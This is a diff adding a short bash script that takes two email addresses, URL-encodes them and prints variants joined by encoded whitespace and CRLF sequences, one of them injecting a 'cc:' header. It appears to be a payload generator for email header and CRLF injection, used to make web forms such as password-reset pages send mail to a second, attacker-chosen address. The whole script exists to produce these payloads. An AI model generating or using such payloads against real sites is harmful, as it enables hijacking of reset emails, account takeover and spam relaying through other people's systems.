@@ -1,0 +1,26 @@
+#!/bin/bash
+
+if [[ $# -eq 2 ]];then
+	#dd url encoding to @ sing
+	#%20 ,%09,%0d%0a ,%0C 
+	email1=$(echo $1 |sed "s/@/%40/g"  |sed "s/\./%2e/g" )
+	email2=$(echo $2 |sed "s/@/%40/g"  |sed "s/\./%2e/g" )
+
+	echo "$1%20$2"
+	echo "$email1%20$email2"
+	echo""
+	echo "$1%09$2"
+	echo "$email1%09$email2"
+	echo""
+	echo "$1%0C$2"
+	echo "$email1%0C$email2"
+	echo""
+	echo "$1%0d%0a$2"
+	echo "$email1%0d%0a$email2"
+	echo""
+	echo "$1%0a%0dcc:$2"
+	echo "$email1%0a%0dcc%3a$email2"
+else
+	echo "this script need tow emails"
+fi
+
